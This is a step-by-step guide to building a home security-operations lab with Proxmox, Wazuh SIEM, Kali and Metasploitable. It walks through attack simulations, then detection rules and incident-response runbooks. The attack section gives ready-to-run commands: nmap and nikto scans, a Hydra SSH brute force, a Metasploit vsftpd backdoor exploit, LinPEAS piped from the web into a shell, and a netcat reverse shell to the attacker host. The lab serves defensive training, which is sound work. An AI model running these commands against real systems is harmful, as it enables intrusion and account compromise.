# 🔴 Red Team SOC Lab — Complete Setup Guide

**Project:** Proxmox-based SOC Lab with Wazuh SIEM + 10 Attack Simulations  
**Timeline:** 7–8 days (from your 2-week roadmap)  
**Author:** Akshay Kumar Sankalapuram

---

## 📋 Overview

This project simulates a real Security Operations Center environment where you:
1. Build a virtualized network in Proxmox
2. Deploy Wazuh SIEM for centralized monitoring
3. Execute 10+ adversarial attack chains from Kali Linux
4. Analyze which attacks Wazuh detects vs. misses
5. Write custom detection rules and incident response runbooks

---

## 🖥️ Hardware Requirements

**Minimum:**
- CPU: 4 cores with VT-x/AMD-V enabled
- RAM: 8GB (12GB+ recommended)
- Disk: 100GB free space
- OS: Any (will be replaced with Proxmox)

**Don't have a spare PC?**
- Option A: Run Proxmox inside VMware Workstation (nested virtualization)
- Option B: Use VirtualBox with smaller VMs (2GB RAM each)

---

## 🚀 Phase 1: Proxmox Installation (Day 1)

### Step 1.1 — Download Proxmox VE

```bash
# Download from official site
https://www.proxmox.com/en/downloads/proxmox-virtual-environment

# Get: proxmox-ve_8.x_amd64.iso (~1GB)
```

### Step 1.2 — Create Bootable USB

**Windows:**
```bash
# Use Rufus: https://rufus.ie
# Select ISO → Write to USB → Boot from USB
```

**Linux:**
```bash
sudo dd if=proxmox-ve_8.x.iso of=/dev/sdX bs=4M status=progress
# Replace /dev/sdX with your USB device (check with lsblk)
```

### Step 1.3 — Install Proxmox

1. Boot from USB
2. Select "Install Proxmox VE (Graphical)"
3. Accept EULA
4. Select target disk (will be wiped!)
5. Set timezone, keyboard layout
6. Set root password (remember this!)
7. Network config:
   - Hostname: `pve.local`
   - IP: Use DHCP (or static if you know your network)
   - Gateway: Your router IP (usually 192.168.1.1)
   - DNS: 8.8.8.8
8. Install (takes 5-10 mins)
9. Reboot
10. Access web UI: `https://YOUR_IP:8006`
    - Login: `root`
    - Password: (what you set)

✅ **Checkpoint:** You should see the Proxmox web interface.

---

## 🌐 Phase 2: Virtual Network Design (Day 1)

### Network Topology

```
Internet
    │
    ├─ Bridge: vmbr0 (External — NAT)
    │
    ├─ 192.168.100.0/24 — Victim Network
    │   ├─ 192.168.100.10 — Ubuntu Server (Victim + Web Server)
    │   └─ 192.168.100.20 — Metasploitable2 (Intentionally Vulnerable)
    │
    ├─ 192.168.200.0/24 — SOC Network
    │   └─ 192.168.200.10 — Ubuntu Server (Wazuh Manager)
    │
    └─ 192.168.50.0/24 — Attacker Network
        └─ 192.168.50.5 — Kali Linux
```

### Step 2.1 — Create Virtual Networks in Proxmox

In Proxmox web UI:

1. Click on your node (pve) → Network
2. Create 3 Linux Bridges:

**Bridge 1: vmbr1 (Victim Network)**
```
Name: vmbr1
IPv4/CIDR: 192.168.100.1/24
Autostart: Yes
Comment: Victim Network
```

**Bridge 2: vmbr2 (SOC Network)**
```
Name: vmbr2
IPv4/CIDR: 192.168.200.1/24
Autostart: Yes
Comment: SOC/Monitoring Network
```

**Bridge 3: vmbr3 (Attacker Network)**
```
Name: vmbr3
IPv4/CIDR: 192.168.50.1/24
Autostart: Yes
Comment: Attacker Network (Kali)
```

3. Apply configuration (may require reboot)

✅ **Checkpoint:** Run `ip a` in Proxmox shell — you should see vmbr1, vmbr2, vmbr3

---

## 💿 Phase 3: VM Creation (Day 1-2)

### Step 3.1 — Download ISOs

Upload these ISOs to Proxmox (local storage → ISO Images):

1. **Kali Linux** (Attacker)
   ```
   https://www.kali.org/get-kali/#kali-installer-images
   File: kali-linux-2024.x-installer-amd64.iso (~3.5GB)
   ```

2. **Ubuntu Server 22.04** (Victim + SOC)
   ```
   https://ubuntu.com/download/server
   File: ubuntu-22.04.x-live-server-amd64.iso (~2GB)
   ```

3. **Metasploitable2** (Vulnerable Target)
   ```
   https://sourceforge.net/projects/metasploitable/
   File: metasploitable-linux-2.0.0.zip
   Extract → upload .vmdk
   ```

### Step 3.2 — Create VMs

#### VM 1: Kali Linux (Attacker)

```
Name: kali-attacker
OS: Linux 6.x kernel
RAM: 4GB
CPU: 2 cores
Disk: 40GB
Network: vmbr3 (Attacker Network)
ISO: kali-linux-2024.x-installer-amd64.iso
```

**Installation:**
- Boot → Graphical Install
- Hostname: `kali`
- Domain: leave blank
- Root password: `toor` (or your choice)
- Partition: Guided — use entire disk
- Install GRUB: Yes
- After install: `apt update && apt install -y kali-linux-headless`

**Set Static IP:**
```bash
sudo nano /etc/network/interfaces

# Add:
auto eth0
iface eth0 inet static
    address 192.168.50.5
    netmask 255.255.255.0
    gateway 192.168.50.1

sudo systemctl restart networking
```

#### VM 2: Ubuntu Server (Victim + Web Server)

```
Name: ubuntu-victim
OS: Linux 6.x kernel
RAM: 2GB
CPU: 2 cores
Disk: 20GB
Network: vmbr1 (Victim Network)
ISO: ubuntu-22.04-live-server-amd64.iso
```

**Installation:**
- Standard Ubuntu Server install
- Hostname: `victim`
- Username: `ubuntu` / Password: `ubuntu`
- Install OpenSSH: Yes
- No additional packages

**Set Static IP:**
```bash
sudo nano /etc/netplan/00-installer-config.yaml

network:
  ethernets:
    ens18:
      addresses:
        - 192.168.100.10/24
      routes:
        - to: default
          via: 192.168.100.1
      nameservers:
        addresses: [8.8.8.8]
  version: 2

sudo netplan apply
```

**Install Apache + DNS:**
```bash
sudo apt update
sudo apt install -y apache2 bind9 openssh-server
sudo systemctl enable apache2 bind9 ssh
echo "<h1>Victim Web Server</h1>" | sudo tee /var/www/html/index.html
```

#### VM 3: Ubuntu Server (Wazuh SOC)

```
Name: wazuh-soc
OS: Linux 6.x kernel
RAM: 4GB (minimum)
CPU: 2 cores
Disk: 30GB
Network: vmbr2 (SOC Network)
ISO: ubuntu-22.04-live-server-amd64.iso
```

**Installation:** Same as Victim VM

**Set Static IP:**
```bash
sudo nano /etc/netplan/00-installer-config.yaml

network:
  ethernets:
    ens18:
      addresses:
        - 192.168.200.10/24
      routes:
        - to: default
          via: 192.168.200.1
      nameservers:
        addresses: [8.8.8.8]
  version: 2

sudo netplan apply
```

#### VM 4: Metasploitable2 (Optional Vulnerable Target)

```
Name: metasploitable2
Import from .vmdk file
RAM: 1GB
CPU: 1 core
Network: vmbr1 (Victim Network)
```

**Login:** `msfadmin` / `msfadmin`

**Set Static IP:**
```bash
sudo nano /etc/network/interfaces

auto eth0
iface eth0 inet static
    address 192.168.100.20
    netmask 255.255.255.0
    gateway 192.168.100.1

sudo /etc/init.d/networking restart
```

✅ **Checkpoint:** All 4 VMs running. Ping test:
```bash
# From Kali:
ping 192.168.100.10  # Victim
ping 192.168.100.20  # Metasploitable
ping 192.168.200.10  # Wazuh
```

---

## 🛡️ Phase 4: Wazuh SIEM Deployment (Day 2)

### Step 4.1 — Install Wazuh Manager + Dashboard

**On wazuh-soc VM (192.168.200.10):**

```bash
# Download Wazuh installation script
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh

# Install all-in-one (Manager + Indexer + Dashboard)
sudo bash ./wazuh-install.sh -a

# This installs:
# - Wazuh Manager (SIEM core)
# - Wazuh Indexer (Elasticsearch)
# - Wazuh Dashboard (Kibana-based UI)
# Takes ~10-15 minutes

# At the end, you'll get:
# Admin credentials:
#   User: admin
#   Password: <RANDOM_PASSWORD>
# 
# SAVE THIS PASSWORD!
```

**Access Dashboard:**
```
https://192.168.200.10
Username: admin
Password: (from install output)
```

### Step 4.2 — Deploy Wazuh Agents on Victim VMs

**On ubuntu-victim (192.168.100.10):**

```bash
# Add Wazuh repo
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg

echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee -a /etc/apt/sources.list.d/wazuh.list

sudo apt update

# Install Wazuh agent
sudo apt install -y wazuh-agent

# Configure to point to manager
sudo nano /var/ossec/etc/ossec.conf

# Find <server> section and set:
<server>
  <address>192.168.200.10</address>
  <port>1514</port>
  <protocol>tcp</protocol>
</server>

# Start agent
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent

# Verify connection
sudo /var/ossec/bin/agent_control -l
```

**Repeat for Metasploitable2 (if using)**

**Verify in Wazuh Dashboard:**
- Go to https://192.168.200.10
- Navigate to: Agents → Agent Overview
- You should see `ubuntu-victim` listed as Active

✅ **Checkpoint:** Wazuh Dashboard accessible + Agents connected

---

## ⚔️ Phase 5: Attack Execution (Days 3-6)

Now the fun part — run attacks from Kali and monitor Wazuh alerts!

### Attack 1: Network Reconnaissance (Nmap)

**On Kali:**
```bash
# Ping sweep
nmap -sn 192.168.100.0/24

# Port scan
nmap -sV -O 192.168.100.10

# Aggressive scan
nmap -A -T4 192.168.100.10 -oN /root/nmap_victim.txt
```

**Check Wazuh:** Look for rule ID 5710 (SSH scan) or 5720 (port scan)

**Document:**
- Did Wazuh alert? Yes/No
- If yes, what rule fired?
- Screenshot the alert

---

### Attack 2: Web Vulnerability Scan (Nikto)

**On Kali:**
```bash
nikto -h http://192.168.100.10 -o /root/nikto_victim.txt
```

**Check Wazuh:** Look for HTTP scan alerts (rule 31100+)

---

### Attack 3: SSH Brute Force (Hydra)

**On Kali:**
```bash
# Create password list
echo -e "password\nubuntu\nadmin\nroot\n123456" > /root/passwords.txt

# Brute force attack
hydra -l ubuntu -P /root/passwords.txt ssh://192.168.100.10 -t 4

# Capture with Wireshark during attack
sudo tcpdump -i eth0 -w /root/brute_force.pcap host 192.168.100.10
```

**Check Wazuh:** Look for rule 5710 (authentication failures)

---

### Attack 4: Metasploit Exploitation

**On Kali:**
```bash
msfconsole

# Search for Metasploitable vulnerabilities
msf6 > search vsftpd

# Use exploit
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.100.20
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.50.5
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

# You should get a shell on Metasploitable2
```

**Check Wazuh:** Look for connection alerts, new process alerts

---

### Attack 5: Lateral Movement (SSH Pivoting)

**Assume you got credentials from Attack 3:**
```bash
# From Kali, SSH into victim
ssh ubuntu@192.168.100.10

# From victim, try to reach other systems
ping 192.168.100.20
ssh msfadmin@192.168.100.20

# Copy files between systems
scp /etc/passwd ubuntu@192.168.100.10:/tmp/
```

**Check Wazuh:** SSH login events, file integrity monitoring

---

### Attack 6: Privilege Escalation

**On victim (after SSH access):**
```bash
# Check sudo misconfigurations
sudo -l

# Download LinPEAS for automated enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Look for SUID binaries
find / -perm -4000 2>/dev/null

# Example: exploit a vulnerable SUID binary (simulated)
# This is for demonstration only — don't use in production!
```

**Check Wazuh:** New process alerts, file modifications

---

### Attack 7: Reverse Shell (Netcat)

**On Kali (listener):**
```bash
nc -lvnp 4444
```

**On Victim (send shell):**
```bash
nc 192.168.50.5 4444 -e /bin/bash
```

**Check Wazuh:** Outbound connection alerts, suspicious process

---

### Attack 8-10: Additional Attacks

Continue with:
- Port scanning different services
- FTP anonymous login attempts
- SMB enumeration (enum4linux)
- SQL injection attempts (if you set up a database)

---

## 📊 Phase 6: Detection Analysis (Days 5-6)

### Create Attack Matrix

Create `attack-scenarios/attack_matrix.md`:

| # | Attack Name | MITRE Tactic | MITRE Technique | Tool Used | Wazuh Alert? | Rule ID | Notes |
|---|-------------|--------------|-----------------|-----------|--------------|---------|-------|
| 1 | Network Recon | Reconnaissance | T1046 | Nmap | Yes | 5720 | Port scan detected |
| 2 | Web Vuln Scan | Reconnaissance | T1595.002 | Nikto | Yes | 31100 | HTTP scan |
| 3 | SSH Brute Force | Credential Access | T1110.001 | Hydra | Yes | 5710 | Multiple auth failures |
| 4 | Remote Exploit | Initial Access | T1190 | Metasploit | Partial | - | Shell creation not logged |
| 5 | Lateral Movement | Lateral Movement | T1021.004 | SSH | Yes | 5715 | New SSH session |
| ... | ... | ... | ... | ... | ... | ... | ... |

---

## 🛠️ Phase 7: Custom Wazuh Rules (Day 6-7)

### Example: Detect Nmap Scans

Create `detection/wazuh_custom_rules.xml`:

```xml
<group name="custom_attacks">
  
  <!-- Detect Nmap SYN scan -->
  <rule id="100001" level="10">
    <if_group>syscheck</if_group>
    <match>nmap</match>
    <description>Nmap scan detected in process list</description>
    <mitre>
      <id>T1046</id>
    </mitre>
  </rule>

  <!-- Detect Hydra brute force -->
  <rule id="100002" level="12">
    <if_sid>5710</if_sid>
    <match>Failed password</match>
    <frequency>5</frequency>
    <timeframe>60</timeframe>
    <description>Possible brute force attack - 5+ failures in 60s</description>
    <mitre>
      <id>T1110</id>
    </mitre>
  </rule>

</group>
```

**Deploy:**
```bash
# On Wazuh manager
sudo cp wazuh_custom_rules.xml /var/ossec/etc/rules/local_rules.xml
sudo systemctl restart wazuh-manager
```

---

## 📝 Phase 8: Incident Response Runbooks (Day 7)

Create 3 runbooks in `runbooks/`:

### runbooks/IR_brute_force.md

```markdown
# Incident Response: SSH Brute Force Attack

## Detection
- **Alert:** Wazuh Rule 5710 (multiple authentication failures)
- **Threshold:** 5+ failed logins within 60 seconds
- **Source:** Wazuh agent on victim server

## Triage
1. Check Wazuh alert details:
   - Source IP
   - Target account
   - Number of attempts
   - Timeframe

2. Query logs:
   ```bash
   sudo grep "Failed password" /var/log/auth.log | tail -50
   ```

3. Determine if attack is ongoing

## Containment
1. Block source IP via firewall:
   ```bash
   sudo ufw deny from <ATTACKER_IP>
   ```

2. If account compromised:
   ```bash
   sudo passwd <username>  # Force password reset
   sudo usermod -L <username>  # Lock account temporarily
   ```

3. Kill active SSH sessions:
   ```bash
   sudo pkill -u <username>
   ```

## Eradication
1. Review all accounts that received brute force attempts
2. Reset passwords for any accounts with weak credentials
3. Implement fail2ban:
   ```bash
   sudo apt install fail2ban
   sudo systemctl enable fail2ban
   ```

## Recovery
1. Unlock legitimate user accounts
2. Notify affected users
3. Monitor for 24 hours for re-attack

## Lessons Learned
- Add to firewall blacklist
- Consider implementing 2FA
- Review password policy
```

Repeat for lateral movement and privilege escalation.

---

## 📸 Phase 9: Documentation & Screenshots (Day 7-8)

### Required Screenshots:

1. Proxmox dashboard showing all 4 VMs running
2. Wazuh dashboard main view
3. Wazuh alerts page with attack detections
4. Wireshark capture during brute force
5. Kali terminal showing successful exploit
6. Network topology diagram

**Save to:** `screenshots/` folder

---

## 🚀 Phase 10: GitHub Publication (Day 8)

### README.md Structure

```markdown
# 🔴 Red Team SOC Lab

Proxmox-based Security Operations Center lab with Wazuh SIEM + 10 adversarial attack simulations.

## Architecture
[Insert network diagram PNG]

## Lab Specifications
- **VMs:** 4 (Kali, Ubuntu Victim, Ubuntu SOC, Metasploitable2)
- **SIEM:** Wazuh 4.7
- **Attack Scenarios:** 10 mapped to MITRE ATT&CK
- **Custom Rules:** 3

## Attack Scenarios
[Link to attack_matrix.md]

## Detection Results
- **Detected:** 7/10 attacks
- **Missed:** 3/10 (custom rules written to address)

## Setup Guide
See [SETUP.md](SETUP.md)

## Screenshots
[Include 3-4 key screenshots]
```

### Git Commands

```bash
cd red-team-soc-lab
git init
git add .
git commit -m "feat: complete SOC lab with Wazuh SIEM and 10 attack scenarios"
git remote add origin https://github.com/YOUR_USERNAME/red-team-soc-lab.git
git push -u origin main
git tag v1.0
git push --tags
```

---

## ✅ Final Checklist

- [ ] Proxmox installed and accessible
- [ ] All 4 VMs created and networked
- [ ] Wazuh Manager installed and dashboard accessible
- [ ] Wazuh agents connected from victim VMs
- [ ] All 10 attack scenarios documented
- [ ] Attack matrix completed with MITRE mapping
- [ ] Wireshark captures saved
- [ ] Custom Wazuh rules written and tested
- [ ] 3 IR runbooks created
- [ ] Network diagram created
- [ ] Screenshots taken
- [ ] README written
- [ ] GitHub repo published
- [ ] Repo pinned on GitHub profile

---

**Timeline Recap:**
- Day 1-2: Proxmox + VMs + Wazuh
- Day 3-5: Execute 10 attacks + Wireshark captures
- Day 6: Detection analysis + custom rules
- Day 7: IR runbooks + screenshots
- Day 8: Docs + GitHub publish

**🎯 You're done! This is a portfolio-grade SOC project.**
